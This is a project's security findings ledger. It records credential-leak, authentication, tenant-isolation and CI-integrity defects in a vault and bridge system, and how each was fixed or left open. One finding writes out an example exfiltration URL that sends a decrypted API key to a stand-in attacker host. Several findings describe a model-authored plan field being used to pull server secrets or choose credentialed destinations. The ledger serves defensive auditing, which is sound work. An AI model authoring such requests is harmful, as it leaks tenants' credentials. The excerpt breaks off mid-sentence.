# Findings ledger

The live findings ledger: OPEN first, then recently fixed, then accepted/by-design. A finding closes
only by a landed fix + committed test, or a written dismissal. Replaces the release FINDINGS table and
the RUN_LOG finding tail. Journey findings keep their `F` ids; later findings use readable slugs.

## OPEN

- **`e2e-estate-15-red-first-honest-measurement`** (OPEN 2026-07-29, MEDIUM, test-coverage — the
  first time the ported e2e estate has ever run to completion anywhere). With the CSP/CORS bring-up
  fixed (`ci-e2e-step-could-never-pass`), the ledger run goes from **134 passed / 97 failed** to
  **212 passed / 15 failed / 5 skipped**, and wall-clock from 46.4 to 14.4 minutes — the earlier
  number was almost entirely `page.waitForURL` timeouts on a login that could never complete, not
  product failures. The remaining 15 are REAL and were masked by those timeouts:
  `artifact-backend-panel`, `artifacts-apps-section`, `integrations-pipedream`,
  `integrations-sections`, `legal-rcbe`, `legal-shared-drift`, `onboarding` (x3), `pages-core`,
  `pages-manage`, `regressions-dashboard`, `simuladores-trabalho`, `update-from-bundle`,
  `vertical-profile`. Causes cluster into: 3 x "backend login returned a JWT" assertions, 4 x plain
  equality mismatches, 2 x missing element/locator, 1 x `sync-legal-shared --check` drift, 1 x
  `simuladores` build failure, and **2 x `Cannot find module scripts/sync-legal-shared.mjs` — a
  script `web/e2e/legal-shared-drift.spec.ts` invokes that does not exist anywhere in the repo or
  its history** (its only reference is that spec, so this is a spec ported without its tool, not a
  deletion). CI's e2e step therefore stays RED after the bring-up fix, and that is the honest state:
  it now runs the estate and reports real defects instead of failing before the first browser
  launched. Close them individually; do not treat the count as one item.
- **`ci-e2e-step-could-never-pass`** (FIXED 2026-07-29, MEDIUM, process — surfaced when the lane
  first reached the e2e step). With typecheck, `npm test` and `npm run build` all green for the
  first time, `npm run e2e` failed for two structural reasons, neither a test defect: (1) Playwright's
  browsers were never installed on the runner, so the first `chromium.launch()` died with
  "Executable doesn't exist at ~/.cache/ms-playwright/..." — `Dockerfile.api` already installs them
  for exactly this reason; (2) the step ran the BARE ledger runner, which needs a live api on :4111
  and reports "10 due driver(s) require a live dev API — an unreachable-server skip is NOT green".
  The repo already contains the fix: `scripts/e2e-with-server.mjs` (`npm run e2e:server`) boots
  dev-api on an ephemeral memory-mongo, waits for READY plus the featured prebuild, runs the ledger
  and tears down — and its own docblock says "CI sets EKOA_SCREENSHOTS_DISABLED", i.e. it was
  written for this lane, which then never called it. FIXED by installing chromium and calling
  `e2e:server`; it needs `npm run build` output, which the preceding step already produces. Same
  class as `ci-typecheck-never-ran` and `subprocess-isolation-test-could-never-pass-on-ci`: a step
  that had never once executed its actual work, invisible for as long as an earlier step failed
  first.
- **`subprocess-isolation-test-could-never-pass-on-ci`** (FIXED 2026-07-29, MEDIUM, test-integrity
  — surfaced the moment CI first reached `npm test`). `api/tests/llm/subprocess-isolation.test.ts`
  asserted that the literal string `ekoa-code` appears nowhere in the SDK subprocess spawn contract,
  using the repo's directory NAME as a proxy for "a host path leaked". On GitHub Actions the repo is
  *named* `ekoa-code`, so GitHub's own injected metadata (`GITHUB_REPOSITORY`,
  `GITHUB_WORKFLOW_REF`) and npm's workspace-PARENT bin entry
  (`/home/runner/work/ekoa-code/node_modules/.bin` — NOT under the checkout root, so correctly kept
  by the F25 `underPathRoot` filter) all contain it. **The test was green locally and structurally
  red on CI, and could never have passed there.** Nobody saw it because the lane died at typecheck
  before reaching `npm test` (`ci-typecheck-never-ran`) — fixing CI is what exposed it. FIXED by
  asserting the invariant the code actually implements: the sandbox is neither the server cwd nor
  the operator home, `env.HOME` is the sandbox, no NON-PATH value carries the checkout or the
  operator home, and PATH carries no segment under the checkout root. PATH is exempt from the
  home-check BY DESIGN and by written disposition (the accepted `subprocess PATH home-path residual`
  below): node and the toolchain live under `$HOME` on nvm/fnm/volta/asdf hosts and the SDK spawns a
  bare `node` against this PATH, so filtering `$HOME` out of it ENOENTs every model subprocess.
  Verified three ways: passes under the simulated CI vars, the old assertion provably fails under
  the same vars, and it still goes red when the PATH-root filter is removed.
- **`gitleaks-red-on-synthetic-fixtures`** (FIXED 2026-07-29, MEDIUM, process — found when the
  first push finally reached CI). The `security-gates` job had been RED since 2026-07-27, failing at
  the gitleaks step on five `generic-api-key` hits. All five are synthetic credential fixtures in
  the Cofre security suite (`sk-live-COFRE-TEST-0001`, `sk-live-EXFILTRATE-ME-0001`,
  `sk-live-BOUNDARY-TEST-0001`, `sk-live-abcdef123456`, and — added by this session's J-3 —
  `deliver-me-J3-SECRET-9911`). They are deliberately secret-SHAPED, because the suites they belong
  to test that a secret-shaped value is redacted, refused or never echoed, and a fixture that did
  not look like a credential would prove nothing. Two consequences of the redness are the reason
  this is MEDIUM rather than cosmetic: a red gate carries no signal, and it had been red long enough
  that a REAL leak would have arrived into an already-failing check. FIXED by allowlisting the five
  VALUES in `scripts/gitleaks.toml` — deliberately not by path: an
  `api/tests/security/**` path allowlist is one line instead of five and would blind the scanner to
  a real token pasted into a test file, which is a normal way credentials escape. Renaming the
  fixtures was not an option: `gitleaks detect` scans git HISTORY, so the original literal stays
  reachable in the commit that introduced it. Going forward a new fixture should carry
  `EKOA-SYNTHETIC-`, covered generically. Verified precise: a real-looking `sk-live-...` in the same
  directory still fails the scan.
- **`bridge-ingress-freetext-header-residual`** (OPEN by design 2026-07-29, LOW, confidentiality —
  found while building H-4). The ingress filter has two legs: value-keyed (exact, for values Cortex
  delivered) and name-pattern (`redactBodyByName`, for credentials Cortex never held). The name leg
  understands JSON keys and `key=value` pairs. A colon-separated header line in free-text stdout —
  `Authorization: Bearer sk-live-...` — matches neither shape and survives it, so such a value is
  removed only when Cortex DELIVERED it and the value leg recognises it. NOT closed, deliberately:
  widening the name leg to colon-separated pairs would fire on ordinary prose, including any
  `word: value` line in a document excerpt, and a filter that mangles legitimate output is one
  people route around. Pinned in BOTH directions by
  `api/tests/security/bridge-ingress-redaction.test.ts` (the leak asserted as surviving, and the
  delivered-value mitigation asserted as working), so if it is ever closed the expectation flips
  and the test says so rather than the behaviour drifting silently.
- **`ci-typecheck-never-ran`** (FIXED 2026-07-28, HIGH, process — found while fixing the red
  typecheck baseline for A-8). **The per-PR CI lane has never successfully typechecked `api/` or
  `web/`.** `.github/workflows/ci.yml` ran `npm run typecheck` with no prior build of `shared`, but
  `api/` and `web/` resolve `@ekoa/shared` through its package `types` field
  (`shared/dist/index.d.ts`), which is gitignored and only exists after `npm run build --workspace
  shared`. On a fresh `npm ci` checkout the step therefore died with **87 x TS2307 "Cannot find
  module '@ekoa/shared'"** — reproduced locally by moving `shared/dist` aside — so the step failed
  for a MISSING ARTIFACT, never reaching a single real type error. A local tree hides it completely,
  because `shared/dist` survives from an earlier build. Two consequences, and the second is the
  reason this is HIGH rather than a chore: (1) `ci` has been red on `main` for at least the last
  eight runs and the redness carried no information, which is how a lane stops being read; (2) real
  type errors accumulated on `main` unnoticed — 9 of them at the time of writing, listed below —
  because nothing anywhere was checking. FIXED by building `shared` before the typecheck step.
  Verification is the next CI run on push; the local equivalent (`rm -rf shared/dist && npm run
  build --workspace shared && npm run typecheck`) is green.
- **`main-typecheck-red-9-errors`** (FIXED 2026-07-28, MEDIUM, correctness — the errors
  `ci-typecheck-never-ran` was hiding). Nine `tsc` errors on clean `main` at `619277b`, all landed
  by recent Cofre work: (a) `scripts/migrate/ciphertext-v2.ts` imported a non-existent export — see
  `k4-migration-dead-on-arrival`, which is the more serious half; (b) `tests/bridge/revoke.test.ts`
  (x2) and `tests/fake-daemon/correlation-join.test.ts` passed a `DelegationActor` without the
  `orgId` that E-1 made REQUIRED — `integration.test.ts` was updated in that change and these two
  were missed; (c) `tests/security/page-value-leaks.test.ts` (x3) built css locators as
  `{strategy:'css', value}` where the `Locator` union requires `{strategy:'css', selector}`, so
  `describeLocator` read `undefined` and the cache content under test was `css="undefined"` — the
  assertions passed while never exercising a well-formed locator, so this was a green test proving
  less than it claimed (now also asserts the selector IS retained, since shape is what the summary
  is allowed to keep); (d) `tests/security/screenshot-masking.test.ts` (x2) indexed
  `mock.calls[0][0]` on a zero-arg `vi.fn`, whose recorded tuple type is `[]` — the `as {...}` cast
  was papering over an argument the mock's type said could not exist. All fixed; `npm run
  typecheck` is green across the three workspaces and `npm test` is 130 shared / 2555 api / 359 web.
- **`shared-suite-counted-twice`** (FIXED 2026-07-28, MEDIUM, test-integrity — found while
  verifying the `ci-typecheck-never-ran` fix). The `shared` suite collected every test TWICE — once
  from `src/`, once from the compiled `dist/` copy — so its reported size was a function of a BUILD
  ARTIFACT, not of the tests. Observed in one sitting: **5 files/130 tests** on a stale dist,
  **6/144** after a rebuild, **3/72** on a clean checkout. The true count is 3 files / 72 tests, so
  every "shared 130" in the recent commit messages was inflated by a factor of ~1.8 and the number
  moved whenever someone happened to build. Two causes, both fixed: `shared/tsconfig.json` compiled
  `src/**/*.test.ts` into the published `dist/` (tests were shipped to consumers as well as
  double-collected) — now excluded; and `shared` had no vitest config, while **Vitest 4 narrowed
  its default `exclude` to `node_modules` and `.git` only**, dropping the dist glob that older
  versions excluded — now `shared/vitest.config.ts` pins `include: src/**/*.test.ts` and restores
  the dist exclusion. `api/` and `web/` were never affected: their builds emit no test files.
  Verified stable at 3/72 across a clean build, a rebuild and a full-lane run. Worth noting for
  anyone auditing the ledger: a census that quotes counts is only as trustworthy as the collection
  behind it, and this one silently changed under a minor-version default.
- **`k4-migration-dead-on-arrival`** (OPEN 2026-07-28, MEDIUM, correctness/governance — found by
  the A-8 typecheck sweep). `api/scripts/migrate/ciphertext-v2.ts` is journaled as landed (commit
  `f993d06`, `docs/decisions.md` 2026-07-28 K-4) but **had never compiled and has never run**. It
  imported `cofreItems` from `src/data/stores.js`, which does not export it — the Cofre item store
  lives in `src/cofre/store.ts`, which exports `__cofreItemsStoreForMigration` for exactly this
  caller. FIXED here only to the extent the red baseline demanded: the import is corrected and the
  file now typechecks. Still OPEN, and this is the part that matters — the migration is **not
  wired and not proven**: (a) nothing registers it in `api/scripts/migrate/cli.ts`, so there is no
  way to invoke it; (b) the `gate:crypto-version` script the decision entry names does not exist in
  `package.json`; (c) it has no test, so `module_tests` never covered it. The consequence is that
  the v1 weakness the entry claims K-4 removes — a v1 row is under the flat global key and decrypts
  under ANY tenant argument — is still fully present in any deployed database, and the journal says
  otherwise. Close by wiring the CLI entry, adding the gate script, and adding a hermetic test that
  seeds v1 rows, migrates, and asserts `noV1CiphertextRemains()`. Note while doing so that
  `noV1CiphertextRemains()` currently CALLS `migrateCiphertextToV2()`, so the "check" mutates the
  database — safe because the migration is idempotent, but a gate that writes is the wrong shape
  and should be split into a read-only scan.
- **`cofre-raw-store-lint-rule-missing`** (FIXED 2026-07-29, LOW, defence-in-depth — found by the
  A-8 sweep). Plan item B-1 specified "an eslint rule forbidding any import of the raw `cofre_items`
  store handle outside `api/src/cofre/`, and forbidding re-derivation of the scoping predicate".
  No such rule exists in `.eslintrc.cjs` — the module-direction zone array lists `./api/src/cofre`
  only as a TARGET that may not import `routes/`/`server.ts`. So the scoped-repository chokepoint
  that makes the Cofre the third `OwnerVisibilityScoped` consumer rests on convention alone, and
  `__cofreItemsStoreForMigration` (a deliberately ugly name, now imported by the migration script)
  is greppable but not enforced. Not exploitable today — the only importer is the migration — but
  the whole point of B-1's chokepoint is that it cannot be bypassed by a future caller who has not
  read the plan. FIXED: `.eslintrc.cjs` bans `**/cofre/store` outside `api/src/cofre/**`, with
  `api/scripts/migrate/**` legitimately outside the rule's file set (a migration rewrites every
  tenant's rows and so cannot go through an owner-scoped repository). Worth recording HOW it was
  nearly got wrong: the first attempt added a second `no-restricted-imports` override for
  `api/src/**`, and because ESLint REPLACES rather than merges that rule per file, it silently wiped
  the `@anthropic-ai` egress ban (FIXED-3/8/13) for every non-llm file while appearing to add a
  rule — a lint config that looked stricter and was materially weaker. Both bans now live in one
  override per file set, and the llm/ and cofre/ exemptions RESTATE the ban they keep instead of
  switching the rule off. All four directions verified against planted imports.
- **`page-values-to-log-and-memory`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery
  gate R-4 + R-5). Two leaks of the same class: values read off a LIVE PAGE of an authenticated
  session. (R-4) `automation/engine.ts` merged verifier-extracted values into the shared `inputs`
  map and logged them with `console.log(\`... ${k}="${v}" ...\`)` — cleartext in the process log,
  and from `inputs` they are template-substituted into downstream `api_call` URLs/headers/bodies
  whose RESOLVED form is persisted. FIXED: the log records the key and the LENGTH only, and a
  secret-shaped KEY NAME (otp/token/password/senha/sessao/credential/pin/cvv, PT-PT included) is
  refused outright so the value never joins `inputs` at all. The vocabulary is pinned in BOTH
  directions — a false positive silently refuses an ordinary input, and a bare `/auth/` matched
  `author`. (R-5) `automation/cache.ts` wrote the resolved action into ORGANIZATIONAL MEMORY at
  tier `active` through the ordinary `createMemory` surface, and `memory/resolver.ts` `isInjectable`
  excluded only `tier==='archive'` — so those rows were term-scored against the user's ordinary
  chat prompt and injected under `# Memória`. `summariseAction` put the first 40 chars of any
  `fill`, the FULL `navigate` URL and the FULL `select` value into the scored `content`, so a
  magic-link or SSO-callback URL was replayed verbatim to the chat model on term overlap. FIXED by
  a `nonMemorable` memory class that `isInjectable` now requires to be absent (structurally "not a
  memory", distinct from `tier:'archive'` which is merely user-hidden), set on every action- and
  assertion-cache row; plus de-valuing the summaries at the source — length for a `fill`, origin +
  pathname for a `navigate` (the query string is where the tokens live), no literal for a `select`
  or an assertion. The cache still works: the exact action lives structurally in `cachePayload`,
  which was never term-scored. Pinned by `api/tests/security/page-value-leaks.test.ts` (44 cases).
- **`screenshot-plane-unauthenticated`** (FIXED 2026-07-27, HIGH, confidentiality + GDPR — Cofre
  discovery gate R-3). `/automation-screenshots` was an `express.static` mount over
  `<dataDir>/automation-runs` with NO auth middleware, NO tenant check and NO expiry. The recorded
  rationale (`docs/decisions.md`, 2026-07-11) was that an `<img>` cannot carry an Authorization
  header, so "the unguessable automationId/runId path IS the capability". Two problems: the PNGs
  are screenshots of an AUTHENTICATED session on a client portal (for this product, processo
  numbers and client NIFs rendered as pixels), and the run id is not treated as a secret anywhere
  else — it travels in SSE frames, persisted step records, the run API and logs. FIXED without
  trading the control away, using the pattern the repo already applies to the SSE stream for the
  identical constraint: a short-lived platform JWT in the query string (`verifySseToken`), then a
  run lookup that checks org and ownership before a byte is streamed. Cross-tenant reads answer
  404, not 403, so existence is not an oracle; an unattributable legacy run (no `orgId`) is refused
  rather than served; path segments go through the containment resolver; non-PNG files are refused.
  The URL SHAPE is unchanged, so every persisted `screenshotUrl` keeps resolving — the web client
  appends `?token=` via the existing `withPreviewToken` helper. RETENTION: nothing ever deleted
  these PNGs (every reference in `api/src` was a write or a path builder), a GDPR erasure gap over
  an unindexed tree, so a 7-day sweeper and a `deleteRunScreenshots` erasure path land in the same
  change. Pinned by `api/tests/security/screenshot-plane.test.ts` (14 cases, including a
  traversal-escape test on the erasure path) and a REWRITTEN
  `api/tests/contract/automation-screenshots.test.ts`, which previously asserted the unauthenticated
  read as the contract.
- **`d8-oauth-custody-plane`** (AUDIT COMPLETE 2026-07-27 — the audit no discovery-gate pass
  covered). The live OAuth credential-custody plane holds refresh tokens TODAY and had received no
  verdict from any of D1-D7. Audited: `integrations/platform-oauth.ts`, `m365-proxy.ts`,
  `prefetch.ts`, `app-sso-sessions.ts`, `pipedream.ts`.

  **CONFORMS, and should be reused rather than replaced.** `platform-oauth.ts` encrypts the token
  bundle at rest through the one crypto module, refreshes on expiry and re-persists, and — the part
  worth calling out — uses a SINGLEFLIGHT per row so a rotating `refresh_token` can never be
  double-spent by a lazy refresh racing a sweep. That is a genuinely hard property and it is already
  correct. External I/O defaults to the SSRF-guarded fetcher. `connect` logs `{provider}` only.
  `m365-proxy.ts` is the CLOSEST SHIPPED ANALOGUE OF THE I9 PRIMITIVE: it forwards the Graph path
  verbatim while injecting a freshly-refreshed Bearer server-side, so the served artifact never sees
  the token — exactly the "caller names a reference, a fixed primitive executes" shape the Cofre
  needs, and WS-J should model on it. `pipedream.ts` keeps project keys in one org-scoped encrypted
  row, decrypted just-in-time and never logged/thrown/returned, behind a master toggle and a billing
  gate. `app-sso-sessions.ts` enforces artifact isolation server-side (`session.appId === canonical
  id`, never by cookie path) and its pending-auth consume is atomic (`findOneAndDelete`), so the
  no-replay property is LOCAL rather than relying on the IdP.

  **DIVERGES — the gaps that matter for the Cofre.** (1) The whole plane is a PARALLEL custody
  path: it never routes through `cofre/unwrap()`, so none of it has a grant, a lock, per-item origin
  binding, or an "item used" Registo event. A user cannot see or revoke these credentials from the
  Cofre, and "Bloquear tudo" does not touch them. (2) It uses the UNSCOPED `encrypt()`, so ciphertext
  is not org-bound — the same finding already recorded against integration credentials, under the
  same single global `ENCRYPTION_KEY`. (3) `prefetch.ts` injects OAuth-fetched email/calendar/file
  CONTENT into the chat SYSTEM PROMPT (`agents/context.ts:170`), cached per org for 60s. That is
  model-bound text and therefore IS covered by the anonymisation chokepoint (`client.ts:967-968`
  anonymises `systemPrompt` as well as `prompt`) — so I1 holds, with the honest residual that the
  coverage is only as good as the deny-list and the PT recognizers. Worth stating explicitly because
  the gate never verdicted it and a reader could reasonably have assumed otherwise.

  **CONSEQUENCE FOR B-4.** The migration should bring these rows under `unwrap()` — gaining grants,
  lock-now/lock-all and the Registo events — WITHOUT rewriting the refresh machinery, whose
  singleflight is the part that is hard to get right. `oauth_token` is already a Cofre item type.
- **`canvas-token-is-a-platform-token`** (FIXED 2026-07-27, HIGH, authentication — Cofre F-1, the
  `api/src/streaming/` security pass). The canvas (screencast) token is signed with the SAME secret
  as platform session tokens and carried NO class marker: `sub` + `jti`, no `aud`. `auth/jwt.ts`'s
  token-class guard only knew about `ekoa-bridge`, so `verifyToken` ACCEPTED a canvas token and
  returned claims with a valid `sub`/`jti` and `role`/`orgId` undefined. `requireAuth` then passed
  it end-to-end: the jti exists, it is not revoked, `getActivation(sub)` resolves for a real user,
  and `iat` is fresh. VERIFIED EMPIRICALLY with a throwaway probe before being written up, not
  inferred from a read. The consequence is not theoretical — every route that authorizes on
  `req.user.sub` ALONE never reads `role` or `orgId`, so a leaked 600-second canvas token was a
  platform bearer token for gateway-key MINT (which returns a long-lived API key), the bridge token
  endpoint, and the Cofre item routes. FIXED with the same mechanism the bridge token already used:
  `aud: 'ekoa-canvas'` minted and required on the media channel, and refused by the platform
  verifier. The guard checks `traceId` as well as `aud`, so a token minted before the audience
  landed gets no grandfathered window. Pinned by `api/tests/security/canvas-token-class.test.ts`
  (8 cases, including a validly-signed pre-audience token that exercises the traceId branch rather
  than merely failing a signature check).
- **`streaming-screencast-has-no-credential-suppression`** (OPEN, HIGH, confidentiality — Cofre F-1;
  BLOCKS F-2 and D-5). The CDP screencast in `api/src/streaming/session.ts` is a continuous JPEG
  stream of the LIVE page, and it is a SEPARATE path from the automation screenshot that H-2/H-3
  masks. `Page.startScreencast` has no mask option — Playwright's `mask` is a `screenshot()` feature
  only — so masking is not available here and SUPPRESSION is the only correct control: the
  screencast must be stopped for the duration of a typist credential window, and the typist must
  refuse to run at all if it cannot confirm the screencast is stopped. Until that lands, WS-F's
  typist must not fill a credential while a canvas session is attached. This is the specific reason
  the plan blocks F-2 on F-1, and it is now a named finding rather than a scheduling note.
- **`browser-context-leak-and-docblock-drift`** (FIXED 2026-07-27, MEDIUM, resource + accuracy —
  Cofre discovery gate G-3). `LocalBrowserSession.dispose()` closed only the PAGE, so every run
  leaked its browser context — and with it the entire cookie jar of an authenticated session — for
  the lifetime of the process. FIXED by retaining the context and closing it in `dispose()`, both
  closes best-effort so teardown never fails a completed run. SEPARATELY, the module's docblock and
  `ensurePage`'s comment described "the owner's PERSISTENT context" with concurrent runs for one
  owner sharing cookies; the composition root has always handed back `browser.newContext()`,
  ignoring the owner entirely. The divergence is safe in the direction that matters — a fresh
  isolated context per session means no cookie jar is reused across runs OR owners, which is
  stricter than the documented model — but reading the docblock instead of the composition root
  produced wrong conclusions twice during the discovery gate. The comments now describe the code as
  built, and the behaviour is pinned by test rather than asserted by comment. Pinned by
  `api/tests/security/browser-context-lifecycle.test.ts` (5 cases).
- **`planner-and-assertion-echo-page-content`** (FIXED 2026-07-27, MEDIUM, confidentiality — Cofre
  discovery gate H-6 + the H-1 assertion leg). Two messages carried content into three destinations
  each: the process log, the RETRY PROMPT sent back to the model, and the persisted record / SSE
  stream rendered to the user. (H-6) `automation/planner.ts` built a 50-character preview of an
  auth-shaped header's VALUE and interpolated it into a cross-validation violation — and the thing
  being reported is by definition a literal credential the model just wrote, so the check designed
  to stop raw tokens in headers was itself copying them into all three sinks. The sibling argv check
  echoed the whole offending argv element. Both now report a CATEGORY: the header NAME, or the argv
  POSITION. (H-1 assertion leg) `automation/executor.ts` `expect_text` echoed 200 raw characters of
  `innerText` from a page of an AUTHENTICATED session, `expect_url` echoed the full URL including
  the query string where magic-link tokens and SSO codes live, and `expect_title` echoed the title
  whole. These are the ONE live in-process DOM-text path the gate identified as reaching the
  rehearsal fixer's prompt. Now: the expectation plus a character COUNT, origin + pathname, and a
  bounded title. Pinned in `api/tests/security/credential-boundaries.test.ts`.
  NOT YET DONE, and explicitly still open: the rest of H-1 — `local_command` stdout/stderr,
  `ekoa_action` results and `extractActionRunOutput` still need the run-scoped `SecretRegistry`
  threaded through the engine, which is a structural change rather than a message fix.
- **`anonymisation-skips-the-pixel-plane`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre
  discovery gate H-2). `api/src/llm/client.ts` anonymises `prompt` and `systemPrompt` at the egress
  chokepoint (`:967-968`) and forwards `images: opts.images` VERBATIM (`:981`) — and
  `api/tests/llm/client.test.ts` PINNED that forwarding as the contract, so the gap read as
  intended behaviour. `docs/security.md` described the pipeline as covering "all model-bound text",
  which is true and false-by-omission at once: a reader took it as covering everything model-bound.
  For this product the pixels are screenshots of an AUTHENTICATED session on a court portal —
  processo numbers, client NIFs, and during a login step the credential itself. FIXED BROWSER-SIDE,
  because a Cortex-side transform on a finished PNG is OCR-and-hope: `automation/screenshot-masking.ts`
  masks credential-bearing regions by LOCATOR at capture time (so the sensitive pixels are never
  rendered into the buffer) with a SOLID mask colour, and `LocalBrowserSession` gains
  `withCaptureSuppressed()` so a credential window takes NO picture at all — a stronger guarantee
  than masking the field. The failure mode is the decisive property: a masking failure returns null,
  which the existing capture path already treats as "no screenshot this step", so it can never
  degrade to an unmasked capture. The pinning test is re-framed in place as plumbing-only and
  `docs/security.md` now states the text/pixel split, including the RESIDUAL: a screenshot still
  carries non-credential page content as untokenized pixels. Pinned by
  `api/tests/security/screenshot-masking.test.ts` (12 cases).
- **`envwhitelist-reads-cortex-env`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery
  gate D4/J-4). `LocalCommandSpec.envWhitelist` was a list of environment variable NAMES accepted
  from the planner (a model) which `buildEnv` resolved against the CORTEX API SERVER's OWN
  `process.env` — provider keys, `ENCRYPTION_KEY`, `JWT_SECRET`, database credentials — and shipped
  the resolved values to a user's machine. A model-authored `envWhitelist: ["JWT_SECRET"]` was a
  complete platform compromise expressed as an ordinary step field. It never had a receiver
  (`ekoa-bridge`'s bash tool hard-scrubs the child to seven names) and `local_command` is unreachable
  end-to-end, so it was latent rather than live — but it would have gone live the moment
  `setDaemonConnectionResolver` was wired. DELETED rather than hardened, in the same change that
  adds the real primitive (`api/src/cofre/process-injection.ts`), because deletion cost nothing then
  and becomes impossible later. Pinned by `api/tests/security/i9-env-injection.test.ts` (29 cases),
  which includes a STATIC GUARD asserting the declaration and both use sites are gone.
- **`cofre-absent`** (IN PROGRESS 2026-07-27, the Cofre build itself — Cofre WS-A/WS-B/WS-C). The
  discovery gate found NO Cofre: no credential item model, no grants, no policy-lock seam, no origin
  binding as a property of a credential, no relay typing, no session store. LANDED SO FAR: the
  `shared/src/cofre.ts` vocabulary with I7 and I8 encoded as SCHEMA (a `certificate_identity` cannot
  hold a TTL grant; a signature relay cannot be constructed without a document name + hash), and
  `api/src/cofre/` with the single `unwrap()` seam — fail-closed on tenancy, an active grant, origin
  binding and existence, all checked before anything decrypts. Owner-scoped, ciphertext-only at rest,
  lock-now / lock-all, and an item view with no value field. Pinned by
  `api/tests/security/cofre-policy-lock.test.ts` (28) and `shared/src/cofre.test.ts` (28).
  STILL OPEN, in plan order: the routes and the product surfaces (WS-D, which must EXTEND the shipped
  `/settings/privacy` grants+ledger area rather than create a parallel one), the typist (WS-F, blocked
  on the `api/src/streaming/` security pass F-1), session-first storage (WS-G), the redaction pipeline's
  remaining legs (WS-H, incl. the image-plane bypass at `llm/client.ts:981` that a TEST currently pins),
  egress selection (WS-I), bridge protocol v2 + the I9 primitive (WS-J), and the KMS envelope (WS-K).
  A D8 audit of the live OAuth credential-custody plane is owed BEFORE the item model is considered
  fixed — `platform-oauth.ts`, `m365-proxy.ts`, `prefetch.ts`, `app-sso-sessions.ts` and
  `pipedream.ts` hold refresh tokens today and no audit issued a verdict on any of them.
- **`bridge-jwt-key-monoculture`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery gate
  R-8). `api/src/bridge/signing.ts` keyed the DelegatedTask HMAC with `loadConfig().jwtSecret` — the
  platform-wide secret that signs every user's session token — while `ekoa-bridge` stores
  `signingSecret` in a plaintext `config.json` (0600) on every paired laptop. Making delegation WORK
  therefore required placing the key behind every session in the deployment on every user's machine,
  so one compromised laptop compromised every session. Worse, NOTHING on the daemon side ever WROTE
  `signingSecret` (`pair.ts:72` only carried an existing value forward; `serve.ts:84` fell back to
  `''`), so in practice the delegated path was unusable without an operator hand-copying
  `JWT_SECRET` — the daemon's verifier refuses an empty key, so it denied every task: fail-closed,
  but for an invisible reason. FIXED by minting a PER-PAIRING secret in `registerPairing`, encrypted
  at rest, preserved across a redial (rotating would silently break a daemon holding the old one)
  and delivered to the owner on the already-authenticated `/bridge/token` exchange. `signDelegatedTask`
  / `verifyDelegatedTaskSig` take the secret as a parameter and refuse an empty one loudly — which
  also CONVERGES this signer with `ekoa-bridge/src/wire/signing.ts`, whose vendored copy parameterised
  the secret and added that guard back in 2026-07-10. A pairing with no secret is REFUSED (`denied`),
  never a fallback. Pinned by `api/tests/security/bridge-key-split.test.ts` (11 cases).
- **`bridge-revoke-unreachable`** (FIXED 2026-07-27, MEDIUM, availability of the kill switch — Cofre
  discovery gate R-9). `revokePairing` (`api/src/bridge/registry.ts:203`) implements terminal
  revocation with a tombstone that survives a redial and closes the live socket — and had NO
  production caller. It was reachable only from `api/tests/*`; the daemon's own `unpair` is
  local-only. A compromised machine could not be cut off except by deactivating the whole account.
  FIXED by mounting `DELETE /api/v1/bridge/pairings/:pairingId` (owner or org-admin — a compromised
  machine is exactly when the org's admin may need to act without the owner), answering 404 rather
  than 403 outside the caller's scope so the route is not an existence oracle, and emitting a
  metadata-only `security::bridge_pairing_revoked` Registo row.
- **`bridge-delegation-org-adopted`** (FIXED 2026-07-27, MEDIUM, tenant isolation — Cofre discovery
  gate E-1). `delegateToLocal` called `getConn(actor.userId)` with NO `expectedOrg`, and
  `DelegationActor` had no `orgId` field, so the task's org was ADOPTED from whatever connection
  resolved rather than checked. Org binding was structural on the connect and provider paths and
  adopted-not-checked on the one dispatch path that mints a SIGNED task. FIXED by carrying `orgId`
  on `DelegationActor` (bound from the run's actor, never a request body) and passing it as
  `expectedOrg`, so a pairing in another org reads as no pairing.
- **`bridge-excerpts-no-denylist`** (FIXED 2026-07-27 in `ekoa-bridge`, MEDIUM, confidentiality —
  Cofre discovery gate H-7). `ekoa-bridge/src/containment/resolver.ts` enforced only that the
  realpath stays inside a granted root. Containment answers "may the daemon touch this location";
  it cannot answer "should these BYTES cross Boundary 1", and they do — `engine.ts` `compose()`
  concatenates file excerpts verbatim into the provider_request body (its own comment: "The
  excerpts cross Boundary 1 here"). A user who granted a project directory containing `.env` or
  `.ssh/` had not consented to shipping their keys to a model. FIXED with a credential-bearing
  denylist applied to the REAL path, kept byte-identical to
  `api/src/security/path-containment.ts`; the two copies should be shared through the release
  artifact rather than by hand. Defence in depth only — containment remains the control.
- **`bridge-ledger-records-secrets`** (FIXED 2026-07-27 in `ekoa-bridge`, MEDIUM, confidentiality —
  Cofre discovery gate H-5). `AutomationLedgerRow.detail` was "the full bash command line, or the
  browser navigation target — recorded in full" per ADR-002, on an append-only, fsynced ledger that
  is forwarded to Cortex as trust-chip metadata. A secret passed as an argv literal
  (`curl -H "Authorization: Bearer …"`) or a one-time code in a URL was written to disk in
  cleartext, permanently, on the user's own machine — by the same component that must hold
  delivered secrets RAM-only. The audit requirement is "which invocation happened, and can I
  correlate two of them", not "what were the argument values", so rows now carry a SHAPE (program
  name + argument count, or origin+pathname) plus `detailHash`, a stable non-reversible correlation
  id. `detailHash` is optional in the schema so pre-H-5 ledger lines still parse instead of reading
  as corrupt. Two existing tier2 assertions pinned the verbatim detail and were updated.
- **`credential-origin-unbound`** (FIXED 2026-07-27, CRITICAL, confidentiality — Cofre discovery
  gate R-2). Credential use had NO origin binding on either HTTP path, and the path where the MODEL
  authored the destination had the WEAKER egress control. `automation/executors/api-call.ts`
  interpolated the decrypted fields of a model-supplied `authIntegrationKey` into a model-supplied
  URL behind only `guardedFetch`'s SSRF check — which by design permits every PUBLIC host — so
  `url: "https://attacker.example/?k={{integration.stripe.api_key}}"` exfiltrated a live tenant
  secret in one hop, and `rehearsal.ts` let the mid-run fixer author both fields.
  `integrations/action-executor.ts` was worse: a bare `globalThis.fetch` behind a `^https?://`
  shape check on a baseUrl written verbatim from an LLM-authored package config, with no SSRF guard
  at all. FIXED by `api/src/security/origin-binding.ts`: `credentialedFetch` /
  `assertOriginAllowed` make `allowedOrigins` a REQUIRED option and refuse an empty list, so
  "we could not determine the binding" and "any host is fine" can never share a code path. Matching
  is exact-host or parent-domain, never a suffix string (`evil-stripe.com` does not satisfy a
